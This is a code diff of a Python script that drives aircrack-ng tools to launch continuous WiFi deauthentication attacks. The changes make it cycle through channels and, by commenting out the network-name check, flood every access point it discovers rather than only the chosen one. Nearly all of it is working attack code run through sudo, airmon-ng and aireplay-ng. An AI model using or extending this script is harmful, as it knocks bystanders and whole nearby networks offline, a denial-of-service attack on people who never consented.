@@ -69,19 +69,25 @@ put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", wlan_inter
 time.sleep(1)
 wifi_name = input("\nEnter the wifi name (ESSID) : ")
 
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", wlan_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+discover_access_points = subprocess.Popen(["sudo", "airodump-ng","--essid", wifi_name,"--band", "abg", "-w" ,"file","--write-interval", "1","--output-format", "csv", wlan_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 time.sleep(1)
 
 def start_deauth():
     processes = []
+    channel = ""
+    network_id.sort(key=lambda x: int(x[1]))
     try:
-        for a in network_id:
-            subprocess.run(["airmon-ng", "start", wlan_interface, a[1]])  # Starting monitor mode on specific channel
-            process = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", a[0], wlan_interface],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        # Start deauth 
-            processes.append(process)
-            print("Deauth ", a[0], " on the channel ", a[1])
         while True:
-            time.sleep(1)
+            for a in network_id:
+                if channel != a[1]:
+                    #time.sleep(2)
+                    channel = a[1] 
+                    subprocess.run(["airmon-ng", "start", wlan_interface, channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Starting monitor mode on specific channel
+                process = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", a[0], wlan_interface],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        # Start deauth 
+                processes.append(process)
+                print("Deauth ", a[0], " on the channel ", a[1])
+                #time.sleep(0.5)
+        
 
     except KeyboardInterrupt:
         for process in processes:
@@ -126,8 +132,8 @@ try:
         print("CTRL-C when you want to start the attack")
         network_id = []
         for index, item in enumerate(active_wireless_networks):
-            if item["ESSID"].strip() == wifi_name:
-                network_id.append([item["BSSID"].strip(), item["channel"].strip()])
+        #    if item["ESSID"].strip() == wifi_name:
+            network_id.append([item["BSSID"].strip(), item["channel"].strip()])
         if len(network_id) == 0:
             print(f"{RED}Wifi name not found!{RESET}")
         else:
@@ -143,6 +149,7 @@ except KeyboardInterrupt:
     for i in range(3):
         time.sleep(1)
         print(".", end="", flush=True)
+
 
 print("\nPress CTRL-C to stop the attack")
 start_deauth()     # Start attack
